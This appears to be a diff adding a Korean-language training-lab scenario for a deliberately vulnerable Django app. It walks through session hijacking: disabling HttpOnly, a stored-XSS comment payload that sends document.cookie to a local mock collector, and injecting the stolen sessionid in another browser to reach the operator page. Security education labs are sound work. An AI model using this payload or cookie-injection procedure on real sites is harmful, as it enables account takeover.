@@ -1,0 +1,32 @@
+[시나리오 B] 세션 탈취 — 다른 브라우저로 계정 이전
+──────────────────────────────────────────────────────────
+전제(중요):
+  - 기본 Django 설정(SESSION_COOKIE_HTTPONLY=True)에서는 document.cookie 로
+    sessionid 를 읽을 수 없다. 즉 '기본 설정만으로 세션 쿠키가 JS 에 노출'되지 않는다.
+  - 세션 탈취를 재현하려면 추가 취약 설정이 필요하다:
+        config.settings.vulnerable → SESSION_COOKIE_HTTPONLY=False
+  - 이 설정이 없으면 아래 payload 의 수집 결과에 sessionid 가 포함되지 않는다
+    (시나리오 A 의 강제 요청형은 여전히 가능).
+
+동작:
+  - 운영자가 댓글을 '열람'하면 document.cookie 를 로컬(모의) 수집기로 전송.
+  - 수집된 sessionid 를 '공격자 브라우저 컨텍스트'의 쿠키로 주입하면 로그인 없이
+    /operator/ 에 접근 가능(계정 탈취).
+
+댓글 본문에 그대로 붙여넣기:
+──────────────────────────────────────────────────────────
+<script>new Image().src='http://localhost:8000/lab/collector/?c='+encodeURIComponent(document.cookie);</script>
+──────────────────────────────────────────────────────────
+수집 확인:
+  - Django admin > 수집기 수신(모의), 또는
+  - lab_collector/stolen_cookies.log, 또는
+  - /lab/status/ 의 'sessionid 포함' 수치
+
+세션 이전(피해자/공격자 분리 — 실제 비밀번호/실제 프로필 미사용):
+  1) 피해 운영자 컨텍스트: 일반 창에서 operator 로그인(피해자 역할).
+  2) 공격자 컨텍스트: 별도 '시크릿 창'(또는 다른 브라우저 프로필)을 연다.
+  3) 공격자 컨텍스트에서 http://localhost:8000 접속 후 개발자도구 콘솔에 입력:
+        document.cookie = "sessionid=<수집된 값>; path=/";
+  4) http://localhost:8000/operator/ 로 이동 → 로그인 없이 접근되면 탈취 성공.
+
+주의: 이것은 교육용 가상 세션이다. 실제 계정/비밀번호/브라우저 프로필을 쓰지 않는다.
